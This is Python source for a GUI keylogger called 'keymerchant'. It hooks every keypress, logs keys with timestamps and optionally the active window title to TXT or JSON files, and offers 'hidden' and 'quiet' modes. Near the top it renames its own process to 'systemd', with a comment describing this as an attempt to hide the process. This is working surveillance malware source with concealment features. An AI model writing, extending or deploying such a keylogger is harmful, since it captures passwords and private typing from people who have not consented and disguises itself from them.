import keyboard, json, setproctitle, sys, customtkinter
# attempt to hide process? have to check if it actually works
setproctitle.setproctitle('systemd')

from tkinter import *
from datetime import datetime
from keymerchant_utils import Logic, GuiUtils
from win32gui import GetWindowText, GetForegroundWindow



# const-variable notation is used loosely here -
#   these variables are all simply globally defined variables
#   and ARE MODIFIED in the flow of the program
KBLISTEN, OUTPUT_STREAM = None, None
QUIET_MODE, HIDDEN_MODE, CURRENTLY_LISTENING, CONTEXT_LOGGING = False, False, False, False
LOGGING_MODE = Logic.LoggingModes.OFF
# Preparing dictionary in case of JSON output choice by user
JSON_OUTPUT_DICT = {'INTRO': '', 'KEYSTROKES': [], 'OUTRO': ''}

# Declaring Tkinter button names globally so that they can be disabled / enabled
#       by the appropriate functions
START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX, QUIET_MODE_CHECKBOX = None, None, None, None



# Callback function called by the keyboard.on_press() hook
def handle_event(event):
    event_data = json.loads(event.to_json())
    event_data['timestamp'] = datetime.fromtimestamp(event_data['time']).strftime('%d-%m-%y %H:%M:%S.%f')[:-3]
    print(f'{event_data['name']}\t-\t{event_data['timestamp']}')

    # Worth considering consolidating single_log_operation into this function
    single_log_operation(event_data)



# Get data about key event from the on_press() callback handler
# If necessary, process it and log it according to the two logging types
def single_log_operation(event):
    global LOGGING_MODE, OUTPUT_STREAM, CONTEXT_LOGGING

    if OUTPUT_STREAM is not None:
        if LOGGING_MODE == Logic.LoggingModes.TXT:
            if CONTEXT_LOGGING:
                OUTPUT_STREAM.write(f"{f'{event['name']:<15}' + f'{'---':<10}{event['timestamp']}' + 
                    f'{'':<5}{'---':<10}{GetWindowText(GetForegroundWindow())}\n'}")
            else:
                OUTPUT_STREAM.write(f"{f'{event['name']:<15}' + f'{'---':<10}{event['timestamp']}\n'}")
            # Flush stream immediately
            OUTPUT_STREAM.flush()
        elif LOGGING_MODE == Logic.LoggingModes.JSON:
            # Stream flushing not possible. See start_logging() function
            if CONTEXT_LOGGING:
                JSON_OUTPUT_DICT['KEYSTROKES'].append({'key': event['name'],
                    'timestamp': event['timestamp'], 'window': GetWindowText(GetForegroundWindow())})
            else:
                JSON_OUTPUT_DICT['KEYSTROKES'].append({'key': event['name'], 'timestamp': event['timestamp']})



def start_logging():
    global KBLISTEN, CURRENTLY_LISTENING, LOGGING_MODE, OUTPUT_STREAM, START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX
    # Change button and field states to safeguard against unexpected user behavior
    START_BUTTON.configure(state = 'disabled')
    STOP_BUTTON.configure(state = 'normal')
    LOGGING_MODE_BOX.configure(state = 'disabled')
    #TODO --- ADD STATE MODIFICATION FOR CTK.COMBOBOX


    try:
        LOGGING_MODE = Logic.LoggingModes[LOGGING_MODE_BOX.get()]
    except KeyError:
        print(f'Invalid logging mode selected: {LOGGING_MODE_BOX.get()}')

    if not CURRENTLY_LISTENING:
        if LOGGING_MODE != Logic.LoggingModes.OFF:
            # Prepare two separate timestamp formats
            start_date = datetime.now()
            # For filename
            filename = f'keymerchant_{start_date.strftime('%d-%m-%Y_%H%M%S')}'
            # For the 'title' / header inside the file
            file_intro_str = f'= = = = = BEGIN KEYMERCHANT LOG - {start_date.strftime('%H:%M:%S.%f // %A, %B %d, %Y')} = = = = ='

            if LOGGING_MODE == Logic.LoggingModes.TXT:
                OUTPUT_STREAM = open(f'{filename}.txt', 'w')
                OUTPUT_STREAM.write(f'{file_intro_str}\n\n')
            elif LOGGING_MODE == Logic.LoggingModes.JSON:
                # JSON logging is NON-IMMEDIATE. The created .json file stays EMPTY
                #   until logging is STOPPED. Only then is the entire dictionary
                #   dumped at once into the file, the file flushed, and finally the
                #   stream closed.

                OUTPUT_STREAM = open(f'{filename}.json', 'w')
                # Prepare the json dictionary
                JSON_OUTPUT_DICT['INTRO'] = file_intro_str

        # Start the actual listener
        KBLISTEN = keyboard.on_press(handle_event)
        CURRENTLY_LISTENING = True

    else:
        # Handle start commands when the listener is already running
        #   (redundant since the Start button is disabled when the listener starts)
        print('Already logging')



def stop_logging():
    global KBLISTEN, CURRENTLY_LISTENING, OUTPUT_STREAM, START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX
    # Change button and field states to safeguard against unexpected user behavior
    START_BUTTON.configure(state='normal')
    STOP_BUTTON.configure(state='disabled')
    LOGGING_MODE_BOX.configure(state='readonly')
    # TODO --- ADD STATE MODIFICATION FOR CTK.COMBOBOX


    # Stop listener
    keyboard.unhook(KBLISTEN)
    CURRENTLY_LISTENING = False

    if OUTPUT_STREAM is not None:
        outro_text = '= = = = = END KEYMERCHANT LOG = = = = ='

        if LOGGING_MODE == Logic.LoggingModes.TXT:
            OUTPUT_STREAM.write(f'\n{outro_text}')
        elif LOGGING_MODE == Logic.LoggingModes.JSON:
            JSON_OUTPUT_DICT['OUTRO'] = outro_text

            # Dump the entire json dictionary into the file
            json.dump(JSON_OUTPUT_DICT, OUTPUT_STREAM, indent = 4, ensure_ascii = False)

        # Close file
        OUTPUT_STREAM.close()
        OUTPUT_STREAM = None



def checkbox_handler(box_id):
    global HIDDEN_MODE, QUIET_MODE, QUIET_MODE_CHECKBOX
    match box_id:
        case 'H':
            # quiet mode cannot be disabled when hidden mode is enabled -
            #   handle logic and boolean operations accordingly
            HIDDEN_MODE = not HIDDEN_MODE
            if HIDDEN_MODE:
                if not QUIET_MODE:
                    QUIET_MODE_CHECKBOX.toggle()
                    QUIET_MODE_CHECKBOX.configure(state='disabled')
            else:
                QUIET_MODE_CHECKBOX.configure(state='normal')
                QUIET_MODE_CHECKBOX.toggle()
            print(f'hidden: {HIDDEN_MODE}')

        case 'Q':
            QUIET_MODE = not QUIET_MODE
            print(f'quiet: {QUIET_MODE}')

        case 'C':
            global CONTEXT_LOGGING
            CONTEXT_LOGGING = not CONTEXT_LOGGING
            print(f'context logging: {CONTEXT_LOGGING}')
        case _:
            print(f'Illegal argument passed to function: {box_id}')



def main():
    root = customtkinter.CTk()
    root.title('kmrcht 0.5a')
    root.geometry('250x300')
    root.resizable(width=False, height=False)
    root.columnconfigure(0, weight=1)
    root.rowconfigure(0, weight=1)
    root.configure(fg_color = '#0A0A0A')
    root.iconbitmap('lavender.ico')

    frame = customtkinter.CTkFrame(root, fg_color = '#0A0A0A')
    frame.grid(column = 0, row = 0, sticky = (N, W, E, S), padx = 10, pady = 10)

    logging_modes = [mode.name for mode in Logic.LoggingModes]

    global START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX, QUIET_MODE_CHECKBOX
    gui_set = GuiUtils.Elements(frame, root, start_logging, stop_logging, logging_modes, checkbox_handler)

    program_title = gui_set.program_title
    program_title.place(relx = 0.0, rely = 0.0, anchor = NW)

    START_BUTTON = gui_set.start_button
    START_BUTTON.place(relx = 0.0, rely = 0.2, anchor = W)

    STOP_BUTTON = gui_set.stop_button
    STOP_BUTTON.place(relx = 0.0, rely = 0.32, anchor = W)

    logging_mode_label = gui_set.logging_mode_label
    logging_mode_label.place(relx = 0.98, rely = 0.22, anchor = E)

    LOGGING_MODE_BOX = gui_set.logging_mode_box
    LOGGING_MODE_BOX.set(logging_modes[0])
    LOGGING_MODE_BOX.place(relx = 1, rely = 0.32, anchor = E)

    hidden_mode_checkbox = gui_set.hidden_mode_checkbox
    hidden_mode_checkbox.place(relx = 0, rely = 0.50, anchor = W)

    QUIET_MODE_CHECKBOX = gui_set.quiet_mode_checkbox
    QUIET_MODE_CHECKBOX.place(relx=0, rely=0.62, anchor=W)

    context_logging_checkbox = gui_set.context_logging_checkbox
    context_logging_checkbox.place(relx = 0, rely = 0.74, anchor = W)
    if sys.platform != 'win32':
        context_logging_checkbox.configure(state = 'disabled')
        context_logging_tooltip = GuiUtils.CustomTooltip(context_logging_checkbox,
            "context logging is only available on Windows (thanks modern linux)")

    quote_label = gui_set.quote_label
    quote_label.place(relx = 0.04, rely = 1, anchor = SW)

    GuiUtils.center_window(root)
    root.mainloop()



if __name__ == "__main__":
    main()